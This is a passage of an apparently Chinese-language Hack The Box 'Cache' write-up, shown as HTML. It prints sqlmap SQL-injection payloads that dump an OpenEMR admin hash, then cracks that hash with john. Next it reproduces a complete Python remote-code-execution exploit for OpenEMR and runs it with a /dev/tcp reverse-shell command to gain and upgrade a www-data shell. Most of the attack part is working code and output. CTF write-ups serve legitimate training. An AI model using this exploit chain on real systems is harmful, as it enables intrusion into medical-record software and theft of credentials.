program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:47:00 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[10:47:00] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[10:47:00] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[10:47:00] [INFO] testing connection to the target URL</span><br><span class="line">[10:47:01] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[10:47:01] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[10:47:01] [INFO] fetching entries of column(s) &#x27;password, username&#x27; for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27;</span><br><span class="line">Database: openemr</span><br><span class="line">Table: users_secure</span><br><span class="line">[1 entry]</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| username      | password                                                     |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[10:47:01] [INFO] table &#x27;openemr.users_secure&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/hms.htb/dump/openemr/users_secure.csv&#x27;</span><br><span class="line">[10:47:01] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 10:47:01 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h2 id="0x09-ç ´è§£hashå€¼"><a href="#0x09-ç ´è§£hashå€¼" class="headerlink" title="0x09.ç ´è§£hashå€¼"></a>0x09.ç ´è§£hashå€¼</h2><p><code>ç ´è§£ä¸ºxxxxxx</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# cat hash </span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$05</span><span class="variable">$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.</span></span><br><span class="line">root@JIYE:~/htb/cache# john -w=/usr/share/wordlists/rockyou.txt hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 32 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">xxxxxx           (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-10-01 10:58) 5.555g/s 4800p/s 4800c/s 4800C/s tristan..felipe</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h2 id="0x10-Googleæœç´¢exp"><a href="#0x10-Googleæœç´¢exp" class="headerlink" title="0x10.Googleæœç´¢exp"></a>0x10.Googleæœç´¢exp</h2><p><code>OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution</code><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDUxNjE=">expåœ°å€<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">ap = argparse.ArgumentParser(description=&quot;OpenEMR RCE&quot;)</span><br><span class="line">ap.add_argument(&quot;host&quot;, help=&quot;Path to OpenEMR (Example: http://127.0.0.1/openemr).&quot;)</span><br><span class="line">ap.add_argument(&quot;-u&quot;, &quot;--user&quot;, help=&quot;Admin username&quot;)</span><br><span class="line">ap.add_argument(&quot;-p&quot;, &quot;--password&quot;, help=&quot;Admin password&quot;)</span><br><span class="line">ap.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Command to run.&quot;)</span><br><span class="line">args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">ascii = &quot;&gt; .---.  ,---.  ,---.  .-. .-.,---.          ,---.    &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;/ .-. ) | .-.\ | .-&#x27;  |  \| || .-&#x27;  |\    /|| .-.\   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;| | |(_)| |-&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;/   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;| | | | | |--&#x27; | .-&#x27;  | |\  || .-&#x27;  (_)\/  ||   (    &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;\ `-&#x27; / | |    |  `--.| | |)||  `--.| \  / || |\ \   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt; )---&#x27;  /(     /( __.&#x27;/(  (_)/( __.&#x27;| |\/| ||_| \)\  &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;(_)    (__)   (__)   (__)   (__)    &#x27;-&#x27;  &#x27;-&#x27;    (__) &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;                                                       \r\n&quot;</span><br><span class="line">ascii+= &quot;   =&#123;&gt;   P R O J E C T    I N S E C U R I T Y   &lt;&#125;=    \r\n&quot;</span><br><span class="line">ascii+= &quot;                                                       \r\n&quot;</span><br><span class="line">ascii+= &quot;         Twitter : &gt;@Insecurity&lt;                       \r\n&quot;</span><br><span class="line">ascii+= &quot;         Site    : &gt;insecurity.sh&lt;                     \r\n&quot;</span><br><span class="line"></span><br><span class="line">green = &quot;\033[1;32m&quot;</span><br><span class="line">red = &quot;\033[1;31m&quot;</span><br><span class="line">clear = &quot;\033[0m&quot;</span><br><span class="line"></span><br><span class="line">load = &quot;[&gt;$&lt;] &quot;.replace(&quot;&gt;&quot;, green).replace(&quot;&lt;&quot;, clear)</span><br><span class="line">err = &quot;[&gt;-&lt;] &quot;.replace(&quot;&gt;&quot;, red).replace(&quot;&lt;&quot;, clear)</span><br><span class="line">intro = ascii.replace(&quot;&gt;&quot;, green).replace(&quot;&lt;&quot;, clear)</span><br><span class="line"></span><br><span class="line">print(intro)</span><br><span class="line"></span><br><span class="line">with requests.session() as s:</span><br><span class="line">    login = &#123;&quot;new_login_session_management&quot;: &quot;1&quot;,</span><br><span class="line">            &quot;authProvider&quot;: &quot;Default&quot;,</span><br><span class="line">            &quot;authUser&quot;: args.user,</span><br><span class="line">            &quot;clearPass&quot;: args.password,</span><br><span class="line">            &quot;languageChoice&quot;: &quot;1&quot;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    print(load + &quot;Authenticating with &quot; + args.user + &quot;:&quot; + args.password)</span><br><span class="line">    r = s.post(args.host + &quot;/interface/main/main_screen.php?auth=login&amp;site=default&quot;, data=login)</span><br><span class="line">    if &quot;login_screen.php?error=1&amp;site=&quot; in r.text:</span><br><span class="line">        print(err + &quot;Failed to Login.&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    # This will rewrite and replace your current GLOBALS, please modify this if you don&#x27;t want that.</span><br><span class="line">    payload = &quot;form_save=Save&amp;srch_desc=&amp;form_0=main_info.php&amp;form_1=..%2F..%2Finterface&quot;</span><br><span class="line">    payload += &quot;%2Fmain%2Fmessages%2Fmessages.php%3Fform_active%3D1&amp;form_2=1&amp;form_3=tabs_&quot;</span><br><span class="line">    payload += &quot;style_full.css&amp;form_4=style_light.css&amp;form_5=__default__&amp;form_6=__default&quot;</span><br><span class="line">    payload += &quot;__&amp;form_7=1&amp;form_8=0&amp;form_9=175&amp;form_10=OpenEMR&amp;form_12=1&amp;form_13=0&amp;form_&quot;</span><br><span class="line">    payload += &quot;14=0&amp;form_16=1&amp;form_21=1&amp;form_22=1&amp;form_23=1&amp;form_24=1&amp;form_25=http%3A%2F&quot;</span><br><span class="line">    payload += &quot;%2Fopen-emr.org%2F&amp;form_26=&amp;form_27=20&amp;form_28=10&amp;form_30=0&amp;form_31=5&amp;for&quot;</span><br><span class="line">    payload += &quot;m_32=0&amp;form_37=English+%28Standard%29&amp;form_38=1&amp;form_42=1&amp;form_43=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;44=1&amp;form_45=1&amp;form_46=1&amp;form_47=1&amp;form_48=1&amp;form_49=1&amp;form_50=1&amp;form_51=&quot;</span><br><span class="line">    payload += &quot;0&amp;form_52=0&amp;form_53=&amp;form_54=2&amp;form_55=.&amp;form_56=%2C&amp;form_57=%24&amp;form_58=&quot;</span><br><span class="line">    payload += &quot;0&amp;form_59=3&amp;form_60=6%2C0&amp;form_61=0&amp;form_62=0&amp;form_63=_blank&amp;form_69=1&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_70=1&amp;form_77=1&amp;form_79=&amp;form_80=&amp;form_81=&amp;form_84=1&amp;form_85=1&amp;form_87=&quot;</span><br><span class="line">    payload += &quot;1&amp;form_89=1&amp;form_90=1&amp;form_91=1&amp;form_92=Y1&amp;form_93=1&amp;form_94=2&amp;form_95=0&amp;&quot;</span><br><span class="line">    payload += &quot;form_97=14&amp;form_98=11&amp;form_99=24&amp;form_100=20&amp;form_102=1&amp;form_103=0&amp;form_1&quot;</span><br><span class="line">    payload += &quot;04=0&amp;form_105=ICD10&amp;form_106=1&amp;form_107=1&amp;form_112=3&amp;form_115=1&amp;form_116=&quot;</span><br><span class="line">    payload += &quot;&amp;form_119=1.00&amp;form_121=0&amp;form_123=&amp;form_125=30&amp;form_126=&amp;form_127=60&amp;for&quot;</span><br><span class="line">    payload += &quot;m_128=&amp;form_129=90&amp;form_130=&amp;form_131=120&amp;form_132=&amp;form_133=150&amp;form_134&quot;</span><br><span class="line">    payload += &quot;=&amp;form_135=1&amp;form_138=1&amp;form_139=1&amp;form_141=1&amp;form_142=0&amp;form_143=localho&quot;</span><br><span class="line">    payload += &quot;st&amp;form_144=&amp;form_145=&amp;form_146=5984&amp;form_147=&amp;form_150=Patient+ID+card&amp;f&quot;</span><br><span class="line">    payload += &quot;orm_151=Patient+Photograph&amp;form_152=Lab+Report&amp;form_153=Lab+Report&amp;form_1&quot;</span><br><span class="line">    payload += &quot;55=100&amp;form_157=8&amp;form_158=17&amp;form_159=15&amp;form_160=day&amp;form_161=1&amp;form_16&quot;</span><br><span class="line">    payload += &quot;2=2&amp;form_163=1&amp;form_164=10&amp;form_165=10&amp;form_166=15&amp;form_167=20&amp;form_168=1&quot;</span><br><span class="line">    payload += &quot;&amp;form_169=%23FFFFFF&amp;form_170=%23E6E6FF&amp;form_171=%23E6FFE6&amp;form_172=%23FFE&quot;</span><br><span class="line">    payload += &quot;6FF&amp;form_173=1&amp;form_174=0&amp;form_176=1&amp;form_177=1&amp;form_178=1&amp;form_181=1&amp;for&quot;</span><br><span class="line">    payload += &quot;m_182=1&amp;form_183=1&amp;form_184=1&amp;form_185=D0&amp;form_186=D0&amp;form_187=0%3A20&amp;for&quot;</span><br><span class="line">    payload += &quot;m_188=0&amp;form_190=33&amp;form_191=0&amp;form_194=7200&amp;form_198=1&amp;form_199=0&amp;form_2&quot;</span><br><span class="line">    payload += &quot;00=0&amp;form_202=&amp;form_203=&amp;form_204=365&amp;form_205=&amp;form_206=1&amp;form_208=&amp;form&quot;</span><br><span class="line">    payload += &quot;_210=&amp;form_211=&amp;form_212=&amp;form_213=&amp;form_214=&amp;form_215=&amp;form_216=SMTP&amp;for&quot;</span><br><span class="line">    payload += &quot;m_217=localhost&amp;form_218=25&amp;form_219=&amp;form_220=&amp;form_221=&amp;form_222=50&amp;for&quot;</span><br><span class="line">    payload += &quot;m_223=50&amp;form_224=&amp;form_225=&amp;form_226=&amp;form_227=50&amp;form_228=&amp;form_229=&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_230=&amp;form_231=1&amp;form_232=1&amp;form_233=1&amp;form_234=1&amp;form_235=1&amp;form_236=1&quot;</span><br><span class="line">    payload += &quot;&amp;form_237=1&amp;form_238=1&amp;form_239=Model+Registry&amp;form_240=125789123&amp;form_24&quot;</span><br><span class="line">    payload += &quot;1=1&amp;form_242=1&amp;form_243=1&amp;form_244=&amp;form_245=&amp;form_246=1&amp;form_247=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;248=1&amp;form_249=5&amp;form_250=1&amp;form_252=1&amp;form_253=1&amp;form_254=1&amp;form_255=1&amp;f&quot;</span><br><span class="line">    payload += &quot;orm_256=1&amp;form_257=1&amp;form_258=1&amp;form_262=&amp;form_263=6514&amp;form_264=&amp;form_26&quot;</span><br><span class="line">    payload += &quot;5=&amp;form_267=1&amp;form_268=0&amp;form_269=%2Fusr%2Fbin&amp;form_270=%2Fusr%2Fbin&amp;form&quot;</span><br><span class="line">    payload += &quot;_271=%2Ftmp&amp;form_272=%2Ftmp&amp;form_273=26&amp;form_274=state&amp;form_275=1&amp;form_27&quot;</span><br><span class="line">    payload += &quot;6=26&amp;form_277=country&amp;form_278=lpr+-P+HPLaserjet6P+-o+cpi%3D10+-o+lpi%3D6&quot;</span><br><span class="line">    payload += &quot;+-o+page-left%3D72+-o+page-top%3D72&amp;form_279=&amp;form_280=&amp;form_282=2018-07-&quot;</span><br><span class="line">    payload += &quot;23&amp;form_283=1&amp;form_285=%2Fvar%2Fspool%2Fhylafax&amp;form_286=enscript+-M+Lett&quot;</span><br><span class="line">    payload += &quot;er+-B+-e%5E+--margins%3D36%3A36%3A36%3A36&amp;form_288=%2Fmnt%2Fscan_docs&amp;for&quot;</span><br><span class="line">    payload += &quot;m_290=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fportal&amp;form_292=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;296=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fpatients&amp;form_297=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;299=&amp;form_300=&amp;form_301=&amp;form_302=https%3A%2F%2Fssh.mydocsportal.com%2Fpr&quot;</span><br><span class="line">    payload += &quot;ovider.php&amp;form_303=https%3A%2F%2Fssh.mydocsportal.com&amp;form_305=https%3A%&quot;</span><br><span class="line">    payload += &quot;2F%2Fyour_cms_site.com%2F&amp;form_306=&amp;form_307=&amp;form_308=0&amp;form_309=https%3&quot;</span><br><span class="line">    payload += &quot;A%2F%2Fhapi.fhir.org%2FbaseDstu3%2F&amp;form_312=https%3A%2F%2Fsecure.newcrop&quot;</span><br><span class="line">    payload += &quot;accounts.com%2FInterfaceV7%2FRxEntry.aspx&amp;form_313=https%3A%2F%2Fsecure.n&quot;</span><br><span class="line">    payload += &quot;ewcropaccounts.com%2Fv7%2FWebServices%2FUpdate1.asmx%3FWSDL%3Bhttps%3A%2F&quot;</span><br><span class="line">    payload += &quot;%2Fsecure.newcropaccounts.com%2Fv7%2FWebServices%2FPatient.asmx%3FWSDL&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_314=21600&amp;form_315=21600&amp;form_316=&amp;form_317=&amp;form_318=&amp;form_319=1&amp;form&quot;</span><br><span class="line">    payload += &quot;_324=&amp;form_325=0&amp;form_327=137&amp;form_328=7C84773D5063B20BC9E41636A091C6F17E&quot;</span><br><span class="line">    payload += &quot;9C1E34&amp;form_329=C36275&amp;form_330=0&amp;form_332=https%3A%2F%2Fphimail.example.&quot;</span><br><span class="line">    payload += &quot;com%3A32541&amp;form_333=&amp;form_334=&amp;form_335=admin&amp;form_336=5&amp;form_339=1&amp;form&quot;</span><br><span class="line">    payload += &quot;_346=LETTER&amp;form_347=30&amp;form_348=30&amp;form_349=72&amp;form_350=30&amp;form_351=P&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_352=en&amp;form_353=LETTER&amp;form_354=5&amp;form_355=5&amp;form_356=5&amp;form_357=8&amp;for&quot;</span><br><span class="line">    payload += &quot;m_358=D&amp;form_359=1&amp;form_360=9&amp;form_361=1&amp;form_362=104.775&amp;form_363=241.3&amp;&quot;</span><br><span class="line">    payload += &quot;form_364=14&amp;form_365=65&amp;form_366=220&quot;</span><br><span class="line"></span><br><span class="line">    p = &#123;&#125;</span><br><span class="line">    for c in payload.replace(&quot;&amp;&quot;, &quot;\n&quot;).splitlines():</span><br><span class="line">        a = c.split(&quot;=&quot;)</span><br><span class="line">        p.update(&#123;a[0]: a[1]&#125;)</span><br><span class="line">   </span><br><span class="line">    # Linux only, but can be easily modified for Windows.</span><br><span class="line">    _cmd = &quot;|| echo &quot; + base64.b64encode(args.cmd) + &quot;|base64 -d|bash&quot;</span><br><span class="line">    p.update(&#123;&quot;form_284&quot;: _cmd&#125;)</span><br><span class="line">    </span><br><span class="line">    print(load + &quot;Injecting payload&quot;)</span><br><span class="line">    s.post(args.host + &quot;/interface/super/edit_globals.php&quot;, data=p)</span><br><span class="line">    sp = s.get(args.host + &quot;/interface/main/daemon_frame.php&quot;) # M4tt D4em0n w0z h3r3 ;PpPpp</span><br><span class="line">    if sp.status_code == 200:</span><br><span class="line">        print(load + &quot;Payload executed&quot;)</span><br></pre></td></tr></table></figure><h2 id="0x11-exploit"><a href="#0x11-exploit" class="headerlink" title="0x11.exploit"></a>0x11.exploit</h2><h3 id="1-é¦–å…ˆéœ€è¦å®‰è£…ç¯å¢ƒargparseåœ°å€"><a href="#1-é¦–å…ˆéœ€è¦å®‰è£…ç¯å¢ƒargparseåœ°å€" class="headerlink" title="1.é¦–å…ˆéœ€è¦å®‰è£…ç¯å¢ƒargparseåœ°å€"></a>1.é¦–å…ˆéœ€è¦å®‰è£…ç¯å¢ƒ<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5weXRob25ob3N0ZWQub3JnL3BhY2thZ2VzLzE4L2RkL2U2MTdjZmMzZjYyMTBhZTE4MzM3NGNkOWY2YTI2YjIwNTE0YmJiNWE3OTJhZjk3OTQ5YzVhYWNkZGYwZi9hcmdwYXJzZS0xLjQuMC50YXIuZ3o=">argparseåœ°å€<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf argparse-1.4.0.tar.gz</span><br><span class="line">cd argparse-1.4.0</span><br><span class="line">python setup.py install</span><br><span class="line">easy_install argparse</span><br><span class="line">pip install argparse</span><br></pre></td></tr></table></figure><h3 id="2-kaliç›‘å¬"><a href="#2-kaliç›‘å¬" class="headerlink" title="2.kaliç›‘å¬"></a>2.kaliç›‘å¬</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ..</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# python2 exp.py http://hms.htb -u openemr_admin -p xxxxxx -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.17.216/6666 0&gt;&amp;1&#x27;</span><br><span class="line"> .---.  ,---.  ,---.  .-. .-.,---.          ,---.    </span><br><span class="line">/ .-. ) | .-.\ | .-&#x27;  |  \| || .-&#x27;  |\    /|| .-.\   </span><br><span class="line">| | |(_)| |-&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;/   </span><br><span class="line">| | | | | |--&#x27; | .-&#x27;  | |\  || .-&#x27;  (_)\/  ||   (    </span><br><span class="line">\ `-&#x27; / | |    |  `--.| | |)||  `--.| \  / || |\ \   </span><br><span class="line"> )---&#x27;  /(     /( __.&#x27;/(  (_)/( __.&#x27;| |\/| ||_| \)\  </span><br><span class="line">(_)    (__)   (__)   (__)   (__)    &#x27;-&#x27;  &#x27;-&#x27;    (__) </span><br><span class="line">                                                       </span><br><span class="line">   =&#123;   P R O J E C T    I N S E C U R I T Y   &#125;=    </span><br><span class="line">                                                       </span><br><span class="line">         Twitter : @Insecurity                       </span><br><span class="line">         Site    : insecurity.sh                     </span><br><span class="line"></span><br><span class="line"><span class="meta">[$</span><span class="bash">] Authenticating with openemr_admin:xxxxxx</span></span><br><span class="line"><span class="meta">[$</span><span class="bash">] Injecting payload</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-åå¼¹shell"><a href="#4-åå¼¹shell" class="headerlink" title="4.åå¼¹shell"></a>4.åå¼¹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.188] 37914</span><br><span class="line">bash: cannot set terminal process group (1684): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure><h3 id="5-å‡çº§shell"><a href="#5-å‡çº§shell" class="headerlink" title="5.å‡çº§shell"></a>5.å‡çº§shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">&lt;ain$ python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;        </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$</span><br></pre></td></tr></table></figure><h3 id="6-å‡çº§ä¸ºäº¤äº’shell"><a href="#6-å‡çº§ä¸ºäº¤äº’shell" class="headerlink" title="6.å‡çº§ä¸ºäº¤äº’shell"></a>6.å‡çº§ä¸ºäº¤äº’shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;e/main$ [1]+  å·²åœæ­¢               nc -nvlp 6666        n$ </span><br><span class="line">[1]+: command not found</span><br><span class="line">&lt;ic_html/interface/main$ root@JIYE:~# stty raw -echo        </span><br><span class="line">root@JIYE:~#: command not found</span><br><span class="line">&lt;lic_html/interface/main$ root@JIYE:~# nc -nvlp 6666        </span><br><span class="line">root@JIYE:~#: command not found</span><br><span class="line">www-data@cache:/var/www/hms.htb/public_html/interface/main$ </span><br><span class="line">&lt;cache:/var/www/hms.htb/public_html/interface/main$         </span><br><span class="line">bash: www-data@cache:/var/www/hms.htb/public_html/interface/main$: No such file or directory</span><br><span class="line">&lt;cache:/var/www/hms.htb/public_html/interface/main$         </span><br><span class="line">bash: 